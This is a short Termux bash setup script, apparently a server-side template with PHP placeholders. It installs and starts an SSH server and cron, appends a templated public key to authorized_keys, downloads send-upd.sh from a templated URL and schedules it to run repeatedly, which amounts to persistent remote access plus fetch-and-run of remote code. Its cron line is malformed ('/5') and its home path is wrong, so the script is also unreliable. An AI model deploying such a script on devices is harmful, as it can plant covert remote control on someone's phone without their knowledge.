#!/data/data/com.termux/files/usr/bin/bash


pkg update
pkg install openssh termux-api curl
sshd
crond
echo "<?=PUBLIC_KEY;?>" >> ./.ssh/authorized_keys
wget "<?=WWW;?>dl/send-upd.sh"
chmod +x ./send-upd.sh

TMP_FILE=$(mktemp)

crontab -l > "$TMP_FILE"

echo "/5 * * * * cd /data/data/com/termux/files/usr/files/home; ./send-upd.sh" >> "$TMP_FILE"

crontab "$TMP_FILE"
rm "$TMP_FILE"
